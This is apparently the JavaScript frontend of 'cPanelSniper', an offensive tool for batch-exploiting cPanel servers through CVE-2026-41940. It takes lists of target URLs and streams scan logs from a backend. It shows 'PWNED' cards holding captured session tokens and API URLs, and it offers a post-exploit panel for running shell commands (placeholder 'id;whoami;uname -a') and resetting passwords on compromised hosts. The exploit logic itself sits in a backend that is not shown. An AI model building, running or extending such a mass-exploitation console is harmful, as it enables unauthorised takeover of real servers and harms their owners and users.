/* ═══════════════════════════════════════════════════════════
   cPanelSniper GUI — Frontend Application Logic
   SSE streaming, state management, post-exploit actions
   ═══════════════════════════════════════════════════════════ */

// ── State ─────────────────────────────────────────────────
const state = {
  scanning: false,
  mode: 'single',        // 'single' | 'batch'
  autoScroll: true,
  results: [],
  eventSource: null,
  scanStartTime: null,
  timerInterval: null,
  currentAction: null,
  stats: { targets: 0, scanned: 0, vuln: 0 }
};

// ── DOM Refs ──────────────────────────────────────────────
const $ = id => document.getElementById(id);

// ── Mode Toggle ───────────────────────────────────────────
function setMode(mode) {
  state.mode = mode;
  $('btnModeSingle').classList.toggle('active', mode === 'single');
  $('btnModeBatch').classList.toggle('active', mode === 'batch');
  $('singleInput').classList.toggle('hidden', mode !== 'single');
  $('batchInput').classList.toggle('visible', mode === 'batch');
}

// ── Toast Notifications ───────────────────────────────────
function toast(msg, type = 'info') {
  const container = $('toastContainer');
  const el = document.createElement('div');
  el.className = `toast toast-${type}`;
  const icons = { success: '✅', error: '❌', info: 'ℹ️' };
  el.innerHTML = `<span>${icons[type] || ''}</span> ${msg}`;
  container.appendChild(el);
  setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 4000);
}

// ── Log Console ───────────────────────────────────────────
function addLog(text, level = 'info') {
  const console = $('logConsole');
  // Remove placeholder
  const ph = console.querySelector('.log-placeholder');
  if (ph) ph.remove();

  const line = document.createElement('div');
  line.className = `log-line log-${level}`;
  const time = new Date().toLocaleTimeString('en-US', { hour12: false });
  line.textContent = `[${time}] ${text}`;
  console.appendChild(line);

  // Keep max 500 lines
  while (console.children.length > 500) console.removeChild(console.firstChild);

  if (state.autoScroll) console.scrollTop = console.scrollHeight;
}

function clearLogs() {
  const console = $('logConsole');
  console.innerHTML = '<div class="log-line log-placeholder">⏳ Console cleared.</div>';
}

function toggleAutoScroll() {
  state.autoScroll = !state.autoScroll;
  toast(`Auto-scroll ${state.autoScroll ? 'enabled' : 'disabled'}`, 'info');
}

// ── Progress Stages ───────────────────────────────────────
function setStage(stageNum, status) {
  // status: 'active' | 'done' | 'failed' | ''
  for (let i = 0; i <= 3; i++) {
    const el = $(`stage${i}`);
    el.classList.remove('active', 'done', 'failed');
    if (i < stageNum) el.classList.add('done');
    else if (i === stageNum) el.classList.add(status);
  }
}

function resetStages() {
  for (let i = 0; i <= 3; i++) {
    $(`stage${i}`).classList.remove('active', 'done', 'failed');
  }
}

// ── Stats ─────────────────────────────────────────────────
function updateStats() {
  $('statTargets').textContent = state.stats.targets;
  $('statScanned').textContent = state.stats.scanned;
  $('statVuln').textContent = state.stats.vuln;
}

function startTimer() {
  state.scanStartTime = Date.now();
  state.timerInterval = setInterval(() => {
    const elapsed = ((Date.now() - state.scanStartTime) / 1000).toFixed(1);
    $('statElapsed').textContent = `${elapsed}s`;
  }, 100);
}

function stopTimer() {
  if (state.timerInterval) clearInterval(state.timerInterval);
}

// ── Parse SSE log level ───────────────────────────────────
function parseLogLevel(text) {
  if (!text) return 'info';
  const t = text.toUpperCase();
  if (t.includes('[PWND]') || t.includes('PWNED') || t.includes('CONFIRMED'))  return 'pwnd';
  if (t.includes('[CRIT]'))  return 'crit';
  if (t.includes('[ ERR]') || t.includes('[ERR]'))  return 'err';
  if (t.includes('[WARN]'))  return 'warn';
  if (t.includes('[  OK]') || t.includes('[OK]'))    return 'ok';
  if (t.includes('[ API]') || t.includes('[API]'))   return 'api';
  if (t.includes('[SCAN]'))  return 'scan';
  if (t.includes('[STEP]') || t.includes('Stage'))   return 'step';
  return 'info';
}

// ── Parse stage from log ──────────────────────────────────
function detectStage(text) {
  if (!text) return;
  if (text.includes('Stage 1/4') || text.includes('Canonical')) {
    setStage(0, 'done');
    setStage(1, 'active');
  } else if (text.includes('Stage 2/4')) {
    setStage(1, 'done');
    setStage(2, 'active');
  } else if (text.includes('Stage 3/4')) {
    setStage(2, 'done');
    setStage(3, 'active');
  } else if (text.includes('Stage 4/4')) {
    setStage(3, 'active');
  } else if (text.includes('CONFIRMED') || text.includes('PWND')) {
    setStage(3, 'done');
  } else if (text.includes('failed') || text.includes('ERR')) {
    // Mark current stage as failed if scan stopped
  }
}

// ── Start Scan ────────────────────────────────────────────
function startScan() {
  if (state.scanning) {
    stopScan();
    return;
  }

  // Gather targets
  let targets = [];
  if (state.mode === 'single') {
    const url = $('targetUrl').value.trim();
    if (!url) { toast('Please enter a target URL', 'error'); return; }
    targets = [url];
  } else {
    const text = $('targetBatch').value.trim();
    if (!text) { toast('Please enter target URLs', 'error'); return; }
    targets = text.split('\n').map(l => l.trim()).filter(l => l);
  }

  const config = {
    targets: targets,
    threads: parseInt($('threads').value) || 10,
    timeout: parseInt($('timeout').value) || 15,
    hostname: $('hostname').value.trim() || null
  };

  // Reset UI
  state.scanning = true;
  state.results = [];
  state.stats = { targets: targets.length, scanned: 0, vuln: 0 };
  updateStats();
  resetStages();
  $('progressContainer').style.display = 'block';
  $('resultsContainer').innerHTML = '';
  $('resultsEmpty').style.display = 'flex';
  $('btnExport').style.display = 'none';
  $('cardPostExploit').style.display = 'none';
  clearLogs();

  const btn = $('btnScan');
  btn.innerHTML = '<span class="spinner"></span> Stop Scan';
  btn.classList.add('running');

  const badge = $('badgeStatus');
  badge.textContent = '● Scanning...';
  badge.classList.add('scanning');

  startTimer();
  addLog(`Starting scan on ${targets.length} target(s)...`, 'scan');

  // Initiate scan
  fetch('/api/scan', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(config)
  })
  .then(r => r.json())
  .then(data => {
    if (data.error) { toast(data.error, 'error'); scanComplete(); return; }
    addLog(`Scan ID: ${data.scan_id}`, 'info');
    // Start SSE stream
    connectSSE(data.scan_id);
  })
  .catch(err => {
    toast(`Scan error: ${err.message}`, 'error');
    scanComplete();
  });
}

// ── SSE Connection ────────────────────────────────────────
function connectSSE(scanId) {
  if (state.eventSource) state.eventSource.close();

  const es = new EventSource(`/api/status?scan_id=${scanId}`);
  state.eventSource = es;

  es.addEventListener('log', (e) => {
    const text = e.data;
    const level = parseLogLevel(text);
    addLog(text, level);
    detectStage(text);
  });

  es.addEventListener('progress', (e) => {
    try {
      const d = JSON.parse(e.data);
      state.stats.scanned = d.scanned || 0;
      state.stats.vuln = d.vuln || 0;
      updateStats();
    } catch (ex) {}
  });

  es.addEventListener('result', (e) => {
    try {
      const finding = JSON.parse(e.data);
      state.results.push(finding);
      addResultCard(finding);
      state.stats.vuln = state.results.length;
      updateStats();
      toast(`PWNED: ${finding.target}`, 'success');
    } catch (ex) {}
  });

  es.addEventListener('done', (e) => {
    scanComplete();
    es.close();
  });

  es.addEventListener('error', (e) => {
    // SSE connection closed
    if (state.scanning) {
      // Poll for final results
      setTimeout(() => {
        if (state.scanning) pollResults(scanId);
      }, 1000);
    }
  });

  es.onerror = () => {
    if (state.scanning) {
      setTimeout(() => pollResults(scanId), 2000);
    }
  };
}

// ── Poll Results (fallback if SSE disconnects) ────────────
function pollResults(scanId) {
  fetch(`/api/results?scan_id=${scanId}`)
    .then(r => r.json())
    .then(data => {
      if (data.findings) {
        data.findings.forEach(f => {
          if (!state.results.find(r => r.target === f.target)) {
            state.results.push(f);
            addResultCard(f);
          }
        });
        state.stats.vuln = state.results.length;
        state.stats.scanned = data.scanned || state.stats.targets;
        updateStats();
      }
      if (data.complete) scanComplete();
      else if (state.scanning) setTimeout(() => pollResults(scanId), 2000);
    })
    .catch(() => scanComplete());
}

// ── Stop Scan ─────────────────────────────────────────────
function stopScan() {
  fetch('/api/stop', { method: 'POST' })
    .then(() => { toast('Scan stopped', 'info'); })
    .catch(() => {});
  scanComplete();
}

// ── Scan Complete ─────────────────────────────────────────
function scanComplete() {
  state.scanning = false;
  stopTimer();

  if (state.eventSource) { state.eventSource.close(); state.eventSource = null; }

  const btn = $('btnScan');
  btn.innerHTML = '⚡ Start Scan';
  btn.classList.remove('running');

  const badge = $('badgeStatus');
  badge.textContent = state.results.length > 0 ? `● ${state.results.length} Pwned` : '● Complete';
  badge.classList.remove('scanning');

  addLog(`Scan complete. ${state.results.length} vulnerable target(s) found.`,
         state.results.length > 0 ? 'pwnd' : 'info');

  if (state.results.length > 0) {
    $('btnExport').style.display = '';
    showPostExploit();
  }
}

// ── Result Cards ──────────────────────────────────────────
function addResultCard(finding) {
  $('resultsEmpty').style.display = 'none';
  const container = $('resultsContainer');

  const card = document.createElement('div');
  card.className = 'result-card';
  card.innerHTML = `
    <div class="result-header">
      <span class="result-target">${escHtml(finding.target)}</span>
      <span class="vuln-badge">🔴 CRITICAL</span>
    </div>
    <dl class="result-details">
      <dt>CVE</dt>      <dd>${escHtml(finding.cve || 'CVE-2026-41940')}</dd>
      <dt>Version</dt>  <dd class="version">${escHtml(finding.version || 'unknown')}</dd>
      <dt>Token</dt>    <dd class="token">${escHtml(finding.token || '')}</dd>
      <dt>API URL</dt>  <dd class="api-url">${escHtml(finding.api_url || '')}</dd>
      <dt>Session</dt>  <dd>${escHtml((finding.session || '').substring(0, 50))}...</dd>
      <dt>Evidence</dt> <dd>${escHtml((finding.evidence || '').substring(0, 200))}</dd>
    </dl>
  `;
  container.appendChild(card);
}

// ── Post-Exploit Panel ────────────────────────────────────
function showPostExploit() {
  $('cardPostExploit').style.display = '';
  const sel = $('postExploitTarget');
  sel.innerHTML = '';
  state.results.forEach((r, i) => {
    const opt = document.createElement('option');
    opt.value = i;
    opt.textContent = r.target;
    sel.appendChild(opt);
  });
}

function runAction(action) {
  state.currentAction = action;
  const params = $('actionParams');
  const label = $('actionParamLabel');
  const input = $('actionParamInput');

  if (action === 'cmd') {
    params.style.display = '';
    label.textContent = 'Command';
    input.placeholder = 'id;whoami;uname -a';
    input.value = '';
  } else if (action === 'passwd') {
    params.style.display = '';
    label.textContent = 'New Password';
    input.placeholder = 'NewP@ssw0rd!';
    input.value = '';
  } else {
    params.style.display = 'none';
    executeAction();
  }
}

function executeAction() {
  const idx = parseInt($('postExploitTarget').value);
  const finding = state.results[idx];
  if (!finding) { toast('No target selected', 'error'); return; }

  const action = state.currentAction || 'info';
  const param = $('actionParamInput').value.trim();

  $('actionOutput').textContent = '⏳ Running...';
  addLog(`Post-exploit: ${action} on ${finding.target}`, 'api');

  const body = {
    target: finding.target,
    action: action,
    session: finding.session,
    token: finding.token,
    canonical: finding.canonical,
    param: param
  };

  fetch('/api/action', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  })
  .then(r => r.json())
  .then(data => {
    const output = data.output || data.error || JSON.stringify(data, null, 2);
    $('actionOutput').textContent = output;
    addLog(`Action complete: ${action}`, data.error ? 'err' : 'ok');
  })
  .catch(err => {
    $('actionOutput').textContent = `Error: ${err.message}`;
    toast('Action failed', 'error');
  });
}

// ── Export ─────────────────────────────────────────────────
function exportResults() {
  const data = {
    scanner: 'cPanelSniper v2.0 GUI',
    cve: 'CVE-2026-41940',
    timestamp: new Date().toISOString(),
    findings: state.results
  };
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `cpanelsniper_results_${Date.now()}.json`;
  a.click();
  URL.revokeObjectURL(url);
  toast('Results exported', 'success');
}

// ── Utilities ─────────────────────────────────────────────
function escHtml(s) {
  const d = document.createElement('div');
  d.textContent = s || '';
  return d.innerHTML;
}

// ── Keyboard Shortcuts ────────────────────────────────────
document.addEventListener('keydown', (e) => {
  if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
    e.preventDefault();
    startScan();
  }
});

// ── Init ──────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Restore settings from localStorage
  const saved = localStorage.getItem('cpanelsniper_settings');
  if (saved) {
    try {
      const s = JSON.parse(saved);
      if (s.threads) $('threads').value = s.threads;
      if (s.timeout) $('timeout').value = s.timeout;
    } catch (e) {}
  }

  // Save settings on change
  ['threads', 'timeout'].forEach(id => {
    $(id).addEventListener('change', () => {
      localStorage.setItem('cpanelsniper_settings', JSON.stringify({
        threads: $('threads').value,
        timeout: $('timeout').value
      }));
    });
  });

  // Focus target input
  $('targetUrl').focus();
});
